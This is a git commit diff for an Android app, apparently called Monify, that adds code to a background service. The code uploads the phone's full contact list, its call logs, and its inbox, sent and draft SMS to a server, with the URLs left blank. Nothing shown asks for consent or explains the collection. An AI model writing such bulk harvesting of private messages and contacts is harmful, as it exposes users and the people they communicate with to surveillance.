fa22d176162afb5d15962967a60e2ebad78d1e1c
knightshade <abhishekpoonia22@gmail.com>
2017-11-03 19:00:42 +0530

    Networking added.

--- app/src/main/java/com/sarl/monify/DataUploadService.java
+++ app/src/main/java/com/sarl/monify/DataUploadService.java
@@ -11,9 +11,16 @@ import android.provider.Telephony;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
+import com.androidnetworking.AndroidNetworking;
+import com.androidnetworking.common.Priority;
+import com.androidnetworking.error.ANError;
+import com.androidnetworking.interfaces.JSONArrayRequestListener;
+import com.google.gson.Gson;
 import com.sarl.monify.dataClasses.CallRecord;
 import com.sarl.monify.dataClasses.Contact;
 import com.sarl.monify.dataClasses.Sms;
+
+import org.json.JSONArray;
 
 import java.util.ArrayList;
 
@@ -29,13 +36,14 @@ public class DataUploadService extends IntentService {
     private Uri outboxUri = Uri.parse("content://sms/sent");
     private Uri draftUri = Uri.parse("content://sms/draft");
     private String[] smsColumns = {"_id", "address", "body", "date"};
-
+    private Gson gson = new Gson();
     public DataUploadService(){
         super("DataUploadService");
     }
 
     @Override
     protected void onHandleIntent(@Nullable Intent intent) {
+        AndroidNetworking.initialize(getApplicationContext());
         Log.d(dataUploadService, "onHandleIntent executing.");
         cr = getContentResolver();
         uploadContact();
@@ -44,6 +52,7 @@ public class DataUploadService extends IntentService {
     }
 
     private void uploadContact(){
+        String contactUrl = "";
         ArrayList<Contact> contactArrayList = new ArrayList<>();
         Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                 null, null, null);
@@ -56,12 +65,28 @@ public class DataUploadService extends IntentService {
         c.close();
 
         Log.d("CONTACT", contactArrayList.get(0).toString() + contactArrayList.size());
-        // Make json array and add each object
-        // JsonArray to string
-        // Network request
+
+        AndroidNetworking.post(contactUrl)
+                .addBodyParameter(gson.toJson(contactArrayList))
+                .setTag("ContactJSON")
+                .setPriority(Priority.MEDIUM)
+                .build()
+                .getAsJSONArray(new JSONArrayRequestListener() {
+                    @Override
+                    public void onResponse(JSONArray response) {
+                        Log.d("ContactResponse", response.toString());
+                    }
+
+                    @Override
+                    public void onError(ANError anError) {
+                        Log.d("ContactError", "Error Occured.");
+                    }
+                });
+
     }
 
     private void uploadCallRecords(){
+        String callRecordsUrl = "";
         ArrayList<CallRecord> callRecordArrayList = new ArrayList<>();
         String[] projection = new String[] {CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
 
@@ -88,12 +113,31 @@ public class DataUploadService extends IntentService {
             Log.d("CALL_INFO", "Security Exception occured.");
         }
 
+        AndroidNetworking.post(callRecordsUrl)
+                .addBodyParameter(gson.toJson(callRecordArrayList))
+                .setTag("CallRecord")
+                .setPriority(Priority.MEDIUM)
+                .build()
+                .getAsJSONArray(new JSONArrayRequestListener() {
+                    @Override
+                    public void onResponse(JSONArray response) {
+                        Log.d("CallRecordResponse", response.toString());
+                    }
+
+                    @Override
+                    public void onError(ANError anError) {
+                        Log.d("CallRecordError", "Error oOccured");
+
+                    }
+                });
+
         // Make json array and add each object
         // JsonArray to string
         // Network request
     }
 
     private void uploadSms(){
+        String smsUrl = "";
         Log.d("SMS", "Entered into SMS");
         ArrayList<Sms> smsArrayList = new ArrayList<>();
         Cursor cinbox = cr.query(inboxUri, smsColumns, null, null, null);
@@ -128,6 +172,22 @@ public class DataUploadService extends IntentService {
         coutbox.close();
         cdraft.close();
 
+        AndroidNetworking.post(smsUrl)
+                .addBodyParameter(gson.toJson(smsArrayList))
+                .setTag("SMSRecord")
+                .setPriority(Priority.MEDIUM)
+                .build()
+                .getAsJSONArray(new JSONArrayRequestListener() {
+                    @Override
+                    public void onResponse(JSONArray response) {
+                        Log.d("SMSResponse", response.toString());
+                    }
+
+                    @Override
+                    public void onError(ANError anError) {
+                        Log.d("SMSError", "Error occured");
+                    }
+                });
         Log.d("SMS", smsArrayList.get(0).toString() + smsArrayList.size());
         // Make json array and add each object
         // JsonArray to string
